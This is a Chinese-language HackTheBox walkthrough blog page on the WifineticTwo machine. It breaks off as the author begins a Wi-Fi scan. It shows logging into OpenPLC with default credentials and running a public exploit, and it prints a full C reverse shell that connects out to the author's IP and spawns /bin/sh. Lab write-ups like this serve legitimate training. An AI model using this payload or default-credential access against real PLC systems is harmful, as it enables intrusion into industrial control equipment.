@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P WifineticTwo這個機器很不穩定，如果有問題記得reset，不敢想象非VIP+玩家要怎麽玩。 高中的時候玩過無綫攻擊，還是有一點記憶的。 pwn by 5 ho">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - WifineticTwo">
+<meta property="og:url" content="https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P WifineticTwo這個機器很不穩定，如果有問題記得reset，不敢想象非VIP+玩家要怎麽玩。 高中的時候玩過無綫攻擊，還是有一點記憶的。 pwn by 5 ho">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-W9mZYHOgRyp5hUYQ-WifineticTwo/image-20240317054346-471vm6e.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-W9mZYHOgRyp5hUYQ-WifineticTwo/image-20240317054700-2ff8x3z.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-W9mZYHOgRyp5hUYQ-WifineticTwo/image-20240317055036-4sk6uqi.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-W9mZYHOgRyp5hUYQ-WifineticTwo/image-20240317055155-ft534zi.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-W9mZYHOgRyp5hUYQ-WifineticTwo/image-20240317062916-a0qzzui.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-W9mZYHOgRyp5hUYQ-WifineticTwo/image-20240317163627-2aekve8.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-W9mZYHOgRyp5hUYQ-WifineticTwo/image-20240317183504-w4e5q5g.png">
+<meta property="article:published_time" content="2024-03-18T02:21:11.000Z">
+<meta property="article:modified_time" content="2024-07-28T08:21:27.813Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-W9mZYHOgRyp5hUYQ-WifineticTwo/image-20240317054346-471vm6e.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - WifineticTwo</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/03/18/htb-fortresses/Akerva/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/03/11/2024-htb-machine/10-FormulaX/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&text=HackTheBox - Machine - WifineticTwo"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&title=HackTheBox - Machine - WifineticTwo"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&is_video=false&description=HackTheBox - Machine - WifineticTwo"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - WifineticTwo&body=Check out this article: https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&title=HackTheBox - Machine - WifineticTwo"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&title=HackTheBox - Machine - WifineticTwo"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&title=HackTheBox - Machine - WifineticTwo"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&title=HackTheBox - Machine - WifineticTwo"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&name=HackTheBox - Machine - WifineticTwo&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&t=HackTheBox - Machine - WifineticTwo"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - WifineticTwo
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-18T02:21:11.000Z" class="dt-published" itemprop="datePublished">2024-03-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="WifineticTwo"><a href="#WifineticTwo" class="headerlink" title="WifineticTwo"></a>WifineticTwo</h1><p>這個機器很不穩定，如果有問題記得reset，不敢想象非VIP+玩家要怎麽玩。</p>
+<p>高中的時候玩過無綫攻擊，還是有一點記憶的。</p>
+<p>pwn by 5 hours.</p>
+<h2 id="0x0-Nmap-TCP"><a href="#0x0-Nmap-TCP" class="headerlink" title="0x0 Nmap TCP"></a>0x0 Nmap TCP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE    REASON         VERSION                                                                                                                                    [69/137]</span><br><span class="line">22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)                                                                                    </span><br><span class="line">| ssh-hostkey:                                                                              </span><br><span class="line">|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)                              </span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9b</span><br><span class="line">pkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF</span><br><span class="line">/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=        </span><br><span class="line">|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)                             </span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=                        </span><br><span class="line">|   256 18:<span class="built_in">cd</span>:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)                           </span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR </span><br><span class="line">         </span><br><span class="line">8080/tcp open  http-proxy syn-ack ttl 63 Werkzeug/1.0.1 Python/2.7.18                                                                                                                     </span><br><span class="line">| http-title: Site doesn<span class="string">&#x27;t have a title (text/html; charset=utf-8).                         </span></span><br><span class="line"><span class="string">|_Requested resource was http://10.129.219.103:8080/login                                   </span></span><br><span class="line"><span class="string">|_http-server-header: Werkzeug/1.0.1 Python/2.7.18                                          </span></span><br><span class="line"><span class="string">.......</span></span><br></pre></td></tr></table></figure>
+
+<p>看起來只有22和8080端口開啓了。</p>
+<h2 id="0x1-8080-OpenPLC"><a href="#0x1-8080-OpenPLC" class="headerlink" title="0x1 8080 - OpenPLC"></a>0x1 8080 - OpenPLC</h2><p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-W9mZYHOgRyp5hUYQ-WifineticTwo/image-20240317054346-471vm6e.png" alt="image">​</p>
+<p>由於一開始什麽密碼都沒有給，所以嘗試下默認密碼登錄</p>
+<blockquote>
+<p>The default username and password is openplc (login) and openplc (password). This means that the first thing you must do after logging in for the first time is <strong>change the default username and password</strong>! It is very easy to do that. Just go to the Users menu, click on the OpenPLC User and change the information as you like.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/openplcproject/openplcproject.github.io/blob/master/runtime/windows/index.md">https://github.com/openplcproject/openplcproject.github.io/blob/master/runtime/windows/index.md</a></p>
+</blockquote>
+<p>谷歌了一下，找到了默認賬號密碼都是 openplc，結果可以登陸進去。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-W9mZYHOgRyp5hUYQ-WifineticTwo/image-20240317054700-2ff8x3z.png" alt="image">​</p>
+<p>這個時候自然是找一下有沒有RCE，找到了這個：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49803" title="https://www.exploit-db.com/exploits/49803">https://www.exploit-db.com/exploits/49803</a></p>
+<p>不過很不幸，哪會有這麽簡單：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exp.py -u http://10.129.219.103:8080 -l  openplc  -p  openplc  -i 10.10.16.17 -r 4444</span><br><span class="line">[+] Remote Code Execution on OpenPLC_v3 WebServer</span><br><span class="line">[+] Checking <span class="keyword">if</span> host http://10.129.219.103:8080 is Up...</span><br><span class="line">[+] Host Up! ...</span><br><span class="line">[+] Trying to authenticate with credentials openplc:openplc</span><br><span class="line">[+] Login success!</span><br><span class="line">[+] PLC program uploading... </span><br><span class="line">[+] Attempt to Code injection...</span><br><span class="line">[+] Spawning Reverse Shell...</span><br><span class="line">[+] Failed to receive connection :(</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-W9mZYHOgRyp5hUYQ-WifineticTwo/image-20240317055036-4sk6uqi.png" alt="image">​</p>
+<p>但是注入成功了之後可以看到名字叫 <code>681871.st</code>​，左邊可以點一下 Hardware 看到源碼：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ladder.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------------</span></span><br><span class="line"><span class="type">int</span> ignored_bool_inputs[] = &#123;<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> ignored_bool_outputs[] = &#123;<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> ignored_int_inputs[] = &#123;<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> ignored_int_outputs[] = &#123;<span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------------</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initCustomLayer</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">updateCustomIn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">updateCustomOut</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> port = <span class="number">4444</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">revsockaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sockt = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    revsockaddr.sin_family = AF_INET;   </span><br><span class="line">    revsockaddr.sin_port = htons(port);</span><br><span class="line">    revsockaddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;10.10.16.17&quot;</span>);</span><br><span class="line"></span><br><span class="line">    connect(sockt, (<span class="keyword">struct</span> sockaddr *) &amp;revsockaddr, </span><br><span class="line">    <span class="keyword">sizeof</span>(revsockaddr));</span><br><span class="line">    dup2(sockt, <span class="number">0</span>);</span><br><span class="line">    dup2(sockt, <span class="number">1</span>);</span><br><span class="line">    dup2(sockt, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> * <span class="type">const</span> argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>點擊保存，會提示保存錯誤，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-W9mZYHOgRyp5hUYQ-WifineticTwo/image-20240317055155-ft534zi.png" alt="image">​</p>
+<p>不存在 <code>./st_files/681871.st</code>​ ，這就很神奇了。</p>
+<p><strong>備注</strong>：經過長時間的debug，web界面本身就有bug，儅第一次使用exp注入了之後，就一直會出現error，就算你刪掉了所有的<code>Programs</code>​也無法成功編譯，服務器直接宕機。（我已經重設了好幾次了）。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-W9mZYHOgRyp5hUYQ-WifineticTwo/image-20240317062916-a0qzzui.png" alt="image">​</p>
+<p>儅你看到504 Gatewat Time-out 和 上面編譯失敗的圖片時，你可以<strong>重設</strong>了。</p>
+<h3 id="正確的方法"><a href="#正確的方法" class="headerlink" title="正確的方法"></a>正確的方法</h3><p>在重設之後，登錄，點左邊的 <code>Hardware</code>​ 修改代碼，例如上面的源碼，保存，你會看到編譯成功。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-W9mZYHOgRyp5hUYQ-WifineticTwo/image-20240317163627-2aekve8.png" alt="image">​</p>
+<p>編譯成功后返回，點擊啓動服務，之後可以得到shell，也就是說整個過程在修改  <code>Bank Program</code>​ 的源碼，</p>
+<p>這個時候可以直接修改 exp.py， 只需要把他改成如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 嘗試修改成原本的文件名字</span></span><br><span class="line">compile_program = options.url + <span class="string">&#x27;/compile-program?file=blank_program.st&#x27;</span>  </span><br></pre></td></tr></table></figure>
+
+<p>​<code>blank_program.st</code>​ 可以在 <code>programs</code>​ 中找到。（這個UI真的很爛，其實名字是可以點進去的）</p>
+<p>沒錯，你拿到shell的時候，也就拿到了 <code>user.txt</code>​ ， user 真是來得莫名其妙。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@attica01:/opt/PLC/OpenPLC_v3/webserver<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x2-linpeas"><a href="#0x2-linpeas" class="headerlink" title="0x2 linpeas"></a>0x2 linpeas</h2><p>爲了快速知道自己在哪裏，於是隨手跑了下linpeas，下面是一些有趣的地方：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我在 LXC 容器裏面</span></span><br><span class="line">Is this a virtual machine? ..... Yes (lxc)</span><br><span class="line">Is this a container? ........... lxccontainer_ttys</span><br><span class="line">AppArmor profile? .............. lxc-container-default-cgns (enforce)</span><br><span class="line"></span><br><span class="line"><span class="comment"># can break out ????</span></span><br><span class="line">?? release_agent breakout 1........ No                                                                                                                                                  </span><br><span class="line">?? release_agent breakout 2........ Yes   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 爲什麽這裏會有 wpa_supplicant</span></span><br><span class="line">/run/wpa_supplicant</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爲什麽會有 wifi 網卡</span></span><br><span class="line">wlan0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500                                                                                                                                     </span><br><span class="line">        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)                                                                                                                            </span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)                                                                                                                                                   </span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0                                                                                                                                     </span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)                                                                                                                                                   </span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0 </span><br></pre></td></tr></table></figure>
+
+<p>嘗試過 <a target="_blank" rel="noopener" href="https://juggernaut-sec.com/docker-breakout-lpe/#Breaking_out_of_a_Non-Privileged_Container_with_the_release_agent_Breakout_2_Method">release_agent breakout 2</a>，但是失敗了。</p>
+<p>由於機器的名字有個wifi，於是就往wifi的方向去發展。</p>
+<h2 id="0x3-wifi"><a href="#0x3-wifi" class="headerlink" title="0x3 wifi"></a>0x3 wifi</h2><p>因爲有wifi的網卡，所以要嘗試去掃一下 SSID，參考<a target="_blank" rel="noopener" href="https://www.baeldung.com/linux/connect-network-cli">這篇文檔</a>，看看有沒有可用的wifi：</p>
